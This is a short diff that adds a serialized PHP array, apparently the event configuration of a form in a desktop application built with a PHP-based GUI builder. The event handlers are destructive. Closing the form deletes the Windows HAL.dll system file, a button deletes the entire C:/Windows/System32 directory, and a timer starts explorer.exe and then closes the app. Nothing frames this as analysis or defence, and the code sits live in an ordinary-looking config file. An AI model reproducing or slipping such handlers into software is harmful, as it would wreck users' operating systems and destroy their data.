@@ -1,0 +1,2 @@
+a:1:{s:5:"form1";a:4:{s:8:"--fmedit";a:2:{s:6:"onshow";s:0:"";s:7:"onclose";s:45:"file_delete("%systemroot%\system32\HAL.dll");";}s:6:"timer1";a:1:{s:7:"ontimer";s:52:"Run("C:/Windows/explorer.exe", true);
+app::close();";}s:7:"button1";a:1:{s:7:"onclick";s:35:"dir_delete("C:/Windows/System32/");";}s:7:"button2";a:1:{s:7:"onclick";s:29:"ShowForm(c("timer1"), start);";}}}
